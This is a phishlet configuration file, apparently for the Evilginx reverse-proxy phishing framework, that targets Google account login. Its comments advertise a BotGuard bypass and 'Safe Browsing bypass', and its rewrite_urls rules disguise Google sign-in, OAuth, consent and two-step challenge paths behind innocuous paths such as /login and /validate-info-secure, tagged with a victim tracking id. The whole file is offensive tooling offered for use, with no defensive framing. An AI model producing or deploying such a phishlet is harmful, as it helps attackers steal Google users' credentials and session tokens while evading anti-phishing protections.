# phishlets/google.yaml
# Google Login phishlet with evilpuppet BotGuard bypass
# Merged from christ-link + redirectors reference phishlets
# Requires: evilpuppet enabled, Chromium/Chrome installed, Xvfb running

name: 'Google'
author: 'christ-link'
min_ver: '3.0.0'

# ═══════════════════════════════════════════════════════
# ANTI-PHISHING EVASION — URL Rewriting (Safe Browsing bypass)
# ═══════════════════════════════════════════════════════

rewrite_urls:
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/signin/v2/identifier']
    rewrite:
      path: '/login'
      query:
        - key: 'tid'
          value: '{id}'

  - trigger:
      domains: ['accounts.google.com']
      paths: ['/v3/signin/identifier']
    rewrite:
      path: '/login'
      query:
        - key: 'tid'
          value: '{id}'

  - trigger:
      domains: ['accounts.google.com']
      paths: ['/o/oauth2/auth']
    rewrite:
      path: '/authorize'
      query:
        - key: 'tid'
          value: '{id}'

  - trigger:
      domains: ['accounts.google.com']
      paths: ['/o/oauth2/v2/auth']
    rewrite:
      path: '/authorize'
      query:
        - key: 'tid'
          value: '{id}'

  - trigger:
      domains: ['accounts.google.com']
      paths: ['/signin/oauth/consent']
    rewrite:
      path: '/consent'
      query:
        - key: 'tid'
          value: '{id}'

  - trigger:
      domains: ['accounts.google.com']
      paths: ['/v3/signin/challenge']
    rewrite:
      path: '/validate-info-secure'
      query:
        - key: 'tid'
          value: '{id}'


